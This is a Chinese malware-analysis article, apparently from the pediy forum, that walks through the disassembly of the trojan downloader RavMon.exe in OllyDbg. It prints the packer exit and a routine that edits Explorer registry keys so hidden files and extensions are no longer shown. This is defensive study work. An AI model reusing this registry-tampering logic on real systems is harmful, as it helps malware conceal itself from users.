
# 木马下载器 RavMon.exe 病毒文件汇编源码分析

> 原文：[`www.pediy.com/kssd/pediy10/76544.html`](https://www.pediy.com/kssd/pediy10/76544.html)

【文章作者】: newjueqi
【作者邮箱】: zengjiansheng1@126.com
【作者 QQ 号】: 190678908
【使用工具】: `OD`
【加壳方式】: 未知壳
【操作平台】: `XP-SP2`
【作者声明】: 本文是站在 `petnt` 大侠肩膀上的成果^-^。`petnt` 大侠发表了“简单病毒 `RavMon.exe` 的分析”（[http://bbs.pediy.com/showthread.php?t=76310](http://bbs.pediy.com/showthread.php?t=76310)），文中没有给出详细的代码分析，本人尝试分析这个病毒，把结果写成文章，当作是 `petnt` 大侠文章的补充。失误之处敬请诸位大侠赐教!

用 `peid` 查看了 `RavMon.exe` 文件，显示结果为：`Nothing found [Overlay] *` ，没关系，这个病毒可以带壳调试，本人也懒得脱壳 ^-^

用 `OD` 打开 `RavMon.exe` 文件，显示如下：

```
004141B0  >  833D 484E4100 0>cmp     dword ptr [414E48], 0    ; 入口地址
004141B7    75 05           jnz     short 004141BE
004141B9    E9 01000000     jmp     004141BF
004141BE    C3              retn
004141BF    E8 46000000     call    0041420A
004141C4    E8 73000000     call    0041423C
004141C9    B8 B0414100     mov     eax, offset <模块入口点>
004141CE    2B05 084E4100   sub     eax, dword ptr [414E08]
004141D4    A3 444E4100     mov     dword ptr [414E44], eax
004141D9    E8 9C000000     call    0041427A
004141DE    E8 1A020000     call    004143FD
004141E3    E8 CA060000     call    004148B2
004141E8    E8 19060000     call    00414806
004141ED    A1 444E4100     mov     eax, dword ptr [414E44]
004141F2    C705 484E4100 0>mov     dword ptr [414E48], 1
004141FC    0105 004E4100   add     dword ptr [414E00], eax
00414202    FF35 004E4100   push    dword ptr [414E00]
00414208    C3              retn    ; 这就是壳的出口
```

然后来到如下的代码：

```
004038BB      6A            db      6A             ;  CHAR 'j'
004038BC   .  60            pushad
004038BD   ?  68 C0954000   push    004095C0
004038C2   ?  E8 81030000   call    00403C48
004038C7   ?  BF 94000000   mov     edi, 94
004038CC   ?  8BC7          mov     eax, edi
004038CE   ?  E8 CD1E0000   call    004057A0
004038D3      89            db      89
004038D4      65            db      65             ;  CHAR 'e'
004038D5      E8            db      E8
```

看到的代码很奇怪，这时只要按 `Ctrl+A` 让 `OD` 重新分析代码，就可以正常显示汇编代码：

```
004038BB   .  6A 60          push    60
004038BD   .  68 C0954000   push    004095C0
004038C2   .  E8 81030000   call    00403C48
004038C7   .  BF 94000000   mov     edi, 94
004038CC   .  8BC7          mov     eax, edi
004038CE   .  E8 CD1E0000   call    004057A0
```

……

……

来到这里：

```
00403A41   .  E8 6ADBFFFF   call    004015B0   ; 这是关键 call，跟进去
```

来到这里

```
004015B0  /$  81EC 90020000 sub     esp, 290
004015B6  |.  A1 88B04000   mov     eax, dword ptr [40B088]
004015BB  |.  53            push    ebx
004015BC  |.  55            push    ebp
004015BD  |.  56            push    esi
004015BE  |.  57            push    edi
004015BF  |.  68 FF000000   push    0FF                 ; /BufSize = FF (255.)
004015C4  |.  68 58B84000   push    0040B858              ; |PathBuffer = RavMon.0040B858
004015C9  |.  33DB         xor     ebx, ebx               ; |
004015CB  |.  53           push    ebx                    ; |hModule => NULL
004015CC  |.  898424 A80200>mov     dword ptr [esp+2A8], e>; |
004015D3  |.  33ED         xor     ebp, ebp               ; |
004015D5  |.  FF15 40904000 call    dword ptr [409040]     ; \GetModuleFileNameA；文件的完整路径存储
在 0040B858
004015DB  |.  68 04010000   push    104
004015E0  |.  68 58B84000   push    0040B858
004015E5  |.  68 60B94000   push    0040B960
004015EA  |.  E8 A11D0000   call    00403390 ；把文件完整路径存储在 0040B960
004015EF  |.  6A 5C         push    5C
004015F1  |.  68 60B94000   push    0040B960
004015F6  |.  E8 651D0000   call    00403360
004015FB  |.  8BF0         mov     esi, eax              ;  RavMon.0040B975
```

……

……

```
0040163A     |.  >add     esp, 8
0040163D     |>  >call    00402370 ；通过修改注册表实现系统将不再显示隐藏文件和扩展名
00402370     /$  >sub     esp, 8
00402373     |.  >push    ebx
00402374     |.  >mov     ebx, dword ptr [409004]    ;  ADVAPI32.RegCreateKeyExA
0040237A     |.  >push    esi
0040237B     |.  >push    edi
0040237C     |.  >push    0                  ; /pDisposition = NULL
0040237E     |.  >lea     eax, dword ptr [esp+10]    ; |
00402382     |.  >push    eax                 ; |pHandle
00402383     |.  >push    0                  ; |pSecurity = NULL
00402385     |.  >push    0F003F             ; |Access = KEY_ALL_ACCESS
0040238A     |.  >push    0        ; |Options = REG_OPTION_NON_VOLATILE
0040238C     |.  >push    0                  ; |Class = NULL
0040238E     |.  >push    0                  ; |Reserved = 0
00402390     |.  >push    004094D8           ; |Subkey =
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL"
00402395     |.  >push    80000002           ; |hKey = HKEY_LOCAL_MACHINE
0040239A     |.  >call    ebx                ; \RegCreateKeyExA
0040239C     |.  >test    eax, eax
0040239E     |.  >mov     esi, dword ptr [40900C]    ;  ADVAPI32.RegSetValueExA
004023A4     |.  >mov     edi, dword ptr [409010]    ;  ADVAPI32.RegCloseKey
004023AA     |.  >jnz     short 004023DA
004023AC     |.  >mov     ecx, dword ptr [esp+C]
004023B0     |.  >push    004094C8           ; /ValueName = "CheckedValue"
004023B5     |.  >push    ecx               ; |hKey=6C
004023B6     |.  >call    dword ptr [409000]         ; \RegDeleteValueA，删除
SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL 中的
CheckedValue
004023BC     |.  >mov     edx, dword ptr [esp+C]
004023C0     |.  >push    4                  ; /BufSize = 4
004023C2     |.  >push    004094C4           ; |Buffer = RavMon.004094C4
004023C7     |.  >push    1                  ; |ValueType = REG_SZ
004023C9     |.  >push    0                  ; |Reserved = 0
004023CB     |.  >push    004094C8           ; |ValueName = "CheckedValue"
004023D0     |.  >push    edx               ; |hKey
004023D1     |.  >call    esi                ; \RegSetValueExA，新建一个 CheckedValue，值为 0
004023D3     |.  >mov     eax, dword ptr [esp+C]
004023D7     |.  >push    eax               ; /hKey
004023D8     |.  >call    edi                ; \RegCloseKey
004023DA     |>  >push    0
004023DC     |.  >lea     ecx, dword ptr [esp+10]
004023E0     |.  >push    ecx
004023E1     |.  >push    0
004023E3     |.  >push    20006
004023E8     |.  >push    0
004023EA     |.  >push    0
004023EC     |.  >push    0
004023EE     |.  >push    00409488           ;  ASCII
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"
004023F3     |.  >push    80000001
004023F8     |.  >call    ebx                  ; \RegCreateKeyExA
004023FA     |.  >test    eax, eax
004023FC     |.  >jnz     short 00402423
004023FE     |.  >push    4
00402400     |.  >lea     edx, dword ptr [esp+14]
00402404     |.  >push    edx
00402405     |.  >push    4
00402407     |.  >push    eax
00402408     |.  >mov     eax, dword ptr [esp+1C]
0040240C     |.  >push    00409480           ;  ASCII "Hidden"
00402411     |.  >push    eax
00402412     |.  >mov     dword ptr [esp+28], 2
0040241A     |.  >call    esi                 ; \RegSetValueExA
0040241C     |.  >mov     ecx, dword ptr [esp+C]
00402420     |.  >push    ecx
00402421     |.  >call    edi                ;  ADVAPI32.RegCloseKey
00402423     |>  >pop     edi
00402424     |.  >pop     esi
00402425     |.  >pop     ebx
00402426     |.  >add     esp, 8
00402429     \\.  >retn
```
